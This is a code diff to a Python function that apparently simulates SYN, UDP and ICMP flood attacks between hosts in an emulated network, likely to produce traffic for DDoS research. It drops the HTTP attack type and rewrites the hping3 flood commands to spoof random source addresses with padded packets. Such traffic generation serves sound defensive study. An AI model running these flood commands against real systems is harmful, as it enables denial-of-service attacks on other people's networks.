@@ -36,7 +36,7 @@ def simulate_attacks(net):
     hosts = [net.get('h1'), net.get('h2'), net.get('h3'), net.get('h4'), net.get('h5'), net.get('h6')]
 
     attack_interval = 10
-    attack_types = ['syn', 'udp', 'icmp', 'http']
+    attack_types = ['syn', 'udp', 'icmp']
     attack_duration = random.randint(60,120)
 
     for _ in range(int(attack_duration / attack_interval)):
@@ -47,7 +47,7 @@ def simulate_attacks(net):
         if attack_type == 'syn':
             for victim in victims:
                 print("Starting SYN flood attack with {} targeting {}...".format(attacker.name, victim))
-                attacker.cmd('hping3 --flood -p 80 -i u5000 {} &'.format(victim))
+                attacker.cmd('hping3 --flood -S -V -d 120 -p 80 --rand-source {} &'.format(victim))
 
         elif attack_type == 'udp':
             for victim in victims:
@@ -57,7 +57,7 @@ def simulate_attacks(net):
         elif attack_type == 'icmp':
             for victim in victims:
                 print("Starting ICMP flood attack with {} targeting {}...".format(attacker.name, victim))
-                attacker.cmd('hping3 --flood --icmp -i u500 {} &'.format(victim))
+                attacker.cmd('hping3 --flood -1 -V -d 120 --rand-source {} &'.format(victim))
 
         time.sleep(attack_interval)
 
